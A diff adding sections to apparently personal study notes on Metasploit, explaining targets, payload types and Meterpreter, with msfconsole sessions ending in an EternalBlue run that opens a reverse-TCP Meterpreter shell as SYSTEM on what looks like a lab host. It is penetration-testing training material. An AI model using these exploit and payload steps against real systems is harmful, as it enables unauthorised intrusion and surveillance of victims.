@@ -22,6 +22,19 @@
     - [Info](#info)
     - [Setting the Target](#setting-the-target)
     - [Running the Exploit](#running-the-exploit)
+  - [Targets](#targets)
+    - [Selecting a Target](#selecting-a-target)
+  - [Payloads](#payloads)
+    - [Payload Types](#payload-types)
+      - [Singles](#singles)
+      - [Stagers](#stagers)
+      - [Stages](#stages)
+    - [Staged Payloads](#staged-payloads)
+      - [Meterpreter Payload](#meterpreter-payload)
+    - [Searching for Payloads](#searching-for-payloads)
+      - [Specific Payloads](#specific-payloads)
+    - [Selecting Payloads](#selecting-payloads)
+    - [Using Payloads](#using-payloads)
 
 ---
 
@@ -505,5 +518,433 @@ msf6 exploit(windows/smb/ms17_010_psexec) > run
 meterpreter> shell
 
 C:\Windows\system32>
+```
+
+## Targets
+
+... are unique OS identifiers taken from the versions of those specific OS which adapt the selected exploit module to run on that particular version of the OS. The ```show targets``` command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let you know that you need to select an exploit module first.
+
+```bash
+msf6 > show targets
+
+[-] No exploit module selected.
+
+...
+
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+
+   Name                  Current Setting                          Required  Description
+   ----                  ---------------                          --------  -----------
+   DBGTRACE              false                                    yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
+   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
+                         rdlists/named_pipes.txt
+   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
+                                                                            /wiki/Using-Metasploit
+   RPORT                 445                                      yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                           no        The service display name
+   SERVICE_NAME                                                   no        The service name
+   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
+                                                                            rmal read/write folder share
+   SMBDomain             .                                        no        The Windows domain to use for authentication
+   SMBPass                                                        no        The password for the specified username
+   SMBUser                                                        no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+### Selecting a Target
+
+If you want to find out more about a specific module and what the vuln behind it does, you can use the ```info``` command.
+
+```bash
+msf6 exploit(windows/browser/ie_execcommand_uaf) > info
+
+       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
+     Module: exploit/windows/browser/ie_execcommand_uaf
+   Platform: Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2012-09-14
+
+Provided by:
+  unknown
+  eromang
+  binjo
+  sinn3r <sinn3r@metasploit.com>
+  juan vazquez <juan.vazquez@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+  1   IE 7 on Windows XP SP3
+  2   IE 8 on Windows XP SP3
+  3   IE 7 on Windows Vista
+  4   IE 8 on Windows Vista
+  5   IE 8 on Windows 7
+  6   IE 9 on Windows 7
+
+Check supported:
+  No
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  OBFUSCATE  false            no        Enable JavaScript obfuscation
+  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT    8080             yes       The local port to listen on.
+  SSL        false            no        Negotiate SSL for incoming connections
+  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+  URIPATH                     no        The URI to use for this exploit (default is random)
+
+Payload information:
+
+Description:
+  This module exploits a vulnerability found in Microsoft Internet 
+  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
+  gets deleted in an unexpected manner, but the same memory is reused 
+  again later in the CMshtmlEd::Exec() function, leading to a 
+  use-after-free condition. Please note that this vulnerability has 
+  been exploited since Sep 14, 2012. Also, note that 
+  presently, this module has some target dependencies for the ROP 
+  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
+  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
+  JRE 1.6.x or below must be installed (which is often the case).
+
+References:
+  https://cvedetails.com/cve/CVE-2012-4969/
+  OSVDB (85532)
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
+  http://technet.microsoft.com/en-us/security/advisory/2757760
+  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
+```
+
+Looking at the description, you can get a general idea of what this exploit will accomplish for you. Keeping this in mind, you would next want to check which versions are vulnerable to this exploit.
+
+```bash
+msf6 exploit(windows/browser/ie_execcommand_uaf) > options
+
+Module options (exploit/windows/browser/ie_execcommand_uaf):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   OBFUSCATE  false            no        Enable JavaScript obfuscation
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   IE 7 on Windows XP SP3
+   2   IE 8 on Windows XP SP3
+   3   IE 7 on Windows Vista
+   4   IE 8 on Windows Vista
+   5   IE 8 on Windows 7
+   6   IE 9 on Windows 7
+```
+
+You see options for both different versions of IE and various Windows versions. Leaving the selection to ```Automatic``` will let msfconsole know that it needs to perform service detection on the given target before launching a successful attack.
+
+If you, however, know what versions are running on your target, you can use the ```set target <index no.>``` command to pick a target from the list.
+
+```bash
+msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   IE 7 on Windows XP SP3
+   2   IE 8 on Windows XP SP3
+   3   IE 7 on Windows Vista
+   4   IE 8 on Windows Vista
+   5   IE 8 on Windows 7
+   6   IE 9 on Windows 7
+
+
+msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
+
+target => 6
+```
+
+## Payloads
+
+A payload in Metasploit refers to a module that aids the exploit module in returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold.
+
+There are three different types of payloads in Metasploit: Singles, Stagers, and Stages.
+
+### Payload Types
+
+#### Singles
+
+... contain the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. Singles are self-contained payloads. They are the sole object sent and executed on the target system, getting you a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.
+
+#### Stagers
+
+... work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.
+
+#### Stages
+
+... are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC injection, and others. Payload stages automatically use middle stagers.
+
+### Staged Payloads
+
+A staged payload is an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.
+
+```bash
+msf6 > show payloads
+
+<SNIP>
+
+535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
+548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+
+<SNIP>
+```
+
+#### Meterpreter Payload
+
+... is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be loaded and unloaded dynamically as required.
+
+Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has "infected". It offers you a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens.
+
+Using Meterpreter, you can also load in different Plugins to assist you with your assessment.
+
+### Searching for Payloads
+
+```bash
+msf6 > show payloads
+
+Payloads
+========
+
+   #    Name                                                Disclosure Date  Rank    Check  Description
+-    ----                                                ---------------  ----    -----  -----------
+   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
+   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
+   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
+   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
+   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
+   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
+   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
+   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
+   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
+   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
+   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
+   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
+   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
+   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
+   
+<SNIP>
+   
+   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
+   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
+   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
+   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
+```
+
+#### Specific Payloads
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
+
+   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
+   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
+
+[*] 14
+```
+
+### Selecting Payloads
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
+
+   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
+
+payload => windows/x64/meterpreter/reverse_tcp
+```
+
+Now, use ```set payload <no.>```, and take a look at the options:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+```
+
+After selecting a payload, you will have more options available to you.
+
+### Using Payloads
+
+For the exploit part (_target_) you will have to set:
+
+- RHOSTS
+- RPORT
+
+For the payload part (_your attacking machine_) you will have to set:
+
+- LHOST
+- LPORT
+
+... leads to:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+meterpreter > whoami
+
+[-] Unknown command: whoami.
+
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\SYSTEM
 ```
 
